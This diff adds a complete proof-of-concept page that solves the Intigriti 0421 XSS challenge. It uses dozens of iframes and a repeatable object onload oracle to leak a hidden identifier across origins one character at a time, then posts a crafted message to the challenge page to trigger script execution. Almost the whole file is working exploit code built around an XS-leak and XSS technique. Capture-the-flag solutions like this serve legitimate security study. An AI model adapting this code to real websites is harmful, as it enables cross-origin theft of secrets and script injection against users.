@@ -1,0 +1,147 @@
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="cache-control" content="no-store">
+</head>
+
+<body>
+    <span>Leaked identifier: <code id=leakedIdentifier></code></span>
+
+    <!-- put style.css into cache so 36 iframes load faster -->
+    <iframe src="//challenge-0421.intigriti.io/style.css" onload=start()></iframe>
+    <script>
+        // The idea is to create an oracle with onSMTH that can be repeated over and over
+        // I used <object onload=> that can be repeated over and over because it triggers
+        // With every request. When the comparision is true, iframe.location++ is called
+        // which when same-origin will change the location. that is one of the possible
+        // xs-leaks of each character. there are probably plenty more solutions to leak
+        // the identifier though.
+
+        const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
+        const payload = alph.split('').map(c =>
+            `/##/.source+identifier<location.hash+/${c}/.source&&` +
+            `!top.x.i_${c !== '~' ? c : 'zz'}.name++&&t.j`
+        ).join(',')
+
+        const thisUrl = location.href.replace('http://', 'https://');
+        const top_url = 'https://challenge-0421.intigriti.io/?error=' + encodeURIComponent(
+            `<object style=width:100% name=x data=${thisUrl}></object><object data=` +
+            `//${location.host}/empty.html name=lload onload=${payload}></object>`
+        );
+
+        top.location = top_url + '##'
+
+        let identifier = '';
+        let iframes_counter = 0;
+
+        const IFRAMES = {}
+
+        let block = false;
+        let INTERVAL;
+
+        const startTime = Date.now();
+        // name++ is a little bit faster than location++, because we can force cached style.css resource
+        // instead /NaN
+        function watchIframeDisappear() {
+            if (block) return;
+            for (let c of alph) {
+                let iname = 'i_' + (c === '~' ? 'zz' : c);
+                try {
+                    // iframe is still here
+                    window[iname].location
+                } catch (e) {
+                    // iframe disappeared
+                    console.log(iname, performance.now());
+                    block = true;
+                    IFRAMES[iname].remove();
+                    let iframe = document.createElement('iframe');
+                    iframe.name = 'i_' + (c === '~' ? 'zz' : c);
+                    iframe.src = '//challenge-0421.intigriti.io/style.css'
+                    document.body.appendChild(iframe);
+                    IFRAMES[iname] = iframe;
+                    iframe.onload = () => {
+                        block = false;
+                        new_char(alph[alph.search(c) - 1]);
+                    }
+                    return;
+                }
+            }
+        }
+
+        // Insert all the iframes to leak character by character, use favicon to load 
+        // them quickly from cache
+        function start() {
+            for (let c of alph) {
+                let iframe = document.createElement('iframe');
+                let iname = 'i_' + (c === '~' ? 'zz' : c);
+                iframe.name = iname;
+                iframe.src = '//challenge-0421.intigriti.io/style.css'
+                document.body.appendChild(iframe);
+                IFRAMES[iname] = iframe;
+                // wait for all iframes to load
+                iframe.onload = () => {
+                    if (!iframe.loaded) {
+                        iframe.loaded = 1;
+                        iframes_counter++;
+                        if (iframes_counter === alph.length) {
+                            allIframesLoaded();
+                        }
+                    }
+                }
+            }
+        }
+
+        function log(identifier) {
+            leakedIdentifier.innerHTML = identifier;
+            console.log(identifier);
+        }
+
+        function new_char(c) {
+            if (c === undefined) {
+                solve(identifier);
+                return;
+            }
+            identifier += c;
+            log(identifier);
+            top.location = top_url + '##' + identifier;
+            top.lload.location = URL.createObjectURL(new Blob([], {
+                type: 'text/html'
+            }));
+        }
+
+        // once the identifier is leaked, use it to trigger full blown XSS
+        function solve(identifier) {
+            clearInterval(INTERVAL);
+            const pocTime = ((Date.now() - startTime) / 1000).toFixed(2);
+            top.postMessage({
+                type: 'waf',
+                identifier,
+                str: `<iframe onload="
+            alert(\`Thanks for playing! \n ~terjanq \n\nPoC time: ${pocTime}s\`)
+            "></iframe>`,
+                safe: true
+            }, '*')
+
+        }
+
+        function allIframesLoaded() {
+            INTERVAL = setInterval(watchIframeDisappear, 10);
+            top.lload.location = URL.createObjectURL(new Blob([], {
+                type: 'text/html'
+            }));
+        }
+    </script>
+    <style>
+        iframe {
+            width: 30px;
+            height: 30px;
+        }
+
+        span {
+            display: block;
+        }
+    </style>
+</body>
+
+</html>
